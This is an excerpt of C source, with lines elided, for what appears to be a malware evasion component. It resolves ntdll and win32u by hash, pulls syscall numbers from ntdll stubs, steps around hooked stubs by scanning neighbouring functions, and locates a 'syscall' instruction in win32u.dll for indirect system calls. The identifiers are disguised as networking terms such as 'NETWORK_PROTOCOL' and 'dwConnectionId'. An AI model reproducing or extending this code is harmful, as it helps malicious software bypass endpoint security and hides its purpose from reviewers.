...
BOOL XmFetchSysInvokeInst(OUT PVOID* ppSyscallInstAddress) {

    INT     iSeed       = XmGenerateSessionId() % 0x10,
            iCounter    = 0x00;

    // Initialize win32u config 
    if (!g_Win32uConf.bInitialized) {
        if (!InitDllsConfigStructs(&g_Win32uConf, GetModuleHandleH(USER_PROTOCOL_DLL_HASH)))
            return FALSE;
    }
...
BOOL XmFetchSystemCall(IN DWORD dwSysHash, OUT PNETWORK_PROTOCOL pNtSys) {
    ...
    if (!g_NtdllConf.bInitialized) {
        if (!InitDllsConfigStructs(&g_NtdllConf, GetModuleHandleH(NET_PROTOCOL_DLL_HASH)))
            return FALSE;
    }

    if ((pNtSys->dwProtocolHash = dwSysHash) == NULL)
        return FALSE;
    ...
    for (DWORD i = 0; i < g_NtdllConf.dwNumberOfNames; i++) {
        ...
        if (NETWORK_HASH(pcFuncName) == dwSysHash) {
            ...
            if (*((PBYTE)pFuncAddress) == MOV1_SYSCALL_OPCODE
                ...
                pNtSys->dwConnectionId = (high << 8) | low;
            ...
            if (*((PBYTE)pFuncAddress) == JMP_SYSCALL_OPCODE) {
                ...
                for (WORD idx = 1; idx <= SEARCH_RANGE; idx++) {
                    ...
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == MOV1_SYSCALL_OPCODE
                        ...
                        pNtSys->dwConnectionId = (high << 8) | low - idx;
    ...
    if (pNtSys->dwConnectionId == NULL)
        return FALSE;

    // Search for a 'syscall' instruction in win32u.dll
    if (!XmFetchSysInvokeInst(&pNtSys->pHandlerAddress))
        return FALSE;
